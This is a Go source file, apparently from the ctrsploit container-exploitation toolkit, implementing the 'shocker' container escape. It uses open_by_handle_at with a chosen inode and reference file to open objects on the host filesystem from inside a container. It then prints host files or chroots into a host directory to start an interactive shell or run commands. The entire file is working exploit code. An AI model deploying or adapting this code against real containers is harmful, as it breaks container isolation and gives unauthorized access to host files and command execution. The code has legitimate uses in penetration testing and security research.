package shocker

import (
	_ "embed"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"syscall"

	"github.com/ctrsploit/ctrsploit/pkg/util"
	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"golang.org/x/sys/unix"
)

// Exploit opens the host filesystem object identified by inode/ref. When the
// object is a directory, it enters it (chroot) and either starts an interactive
// shell (command == "") or runs the given command once, in that order.
func Exploit(inode int, ref, command string, i io.Reader, o, e io.Writer) (err error) {
	fd, err := GetFd(inode, ref)
	if err != nil {
		return
	}
	f := os.NewFile(uintptr(fd), fmt.Sprintf("/proc/self/fd/%d", fd))
	fi, err := f.Stat()
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	if fi.IsDir() {
		err = Chroot(fd, command, i, o, e)
		if err != nil {
			return
		}
	} else {
		if command != "" {
			log.Logger.Warnf("--cmd is ignored: inode %d is a file, not a directory", inode)
		}
		fmt.Printf("stat: %+v\n", fi)
		content, e := io.ReadAll(f)
		if e != nil {
			err = e
			awesome_error.CheckErr(err)
			return
		}
		fmt.Println(string(content))
	}
	return
}

func GetFd(inode int, ref string) (fd int, err error) {
	hostReference, err := syscall.Open(ref, syscall.O_RDONLY, 0)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	defer syscall.Close(hostReference)
	inodeBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(inodeBytes, uint64(inode))
	handle := unix.NewFileHandle(1, inodeBytes)
	fd, err = unix.OpenByHandleAt(hostReference, handle, unix.O_RDONLY)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	return
}

func Chroot(rootFd int, command string, i io.Reader, o, e io.Writer) (err error) {
	dir := fmt.Sprintf("/proc/self/fd/%d", rootFd)
	if command == "" {
		return util.InvokeShellUnderDir(dir, i, o, e)
	}
	return util.InvokeCommandUnderDir(dir, command, i, o, e)
}
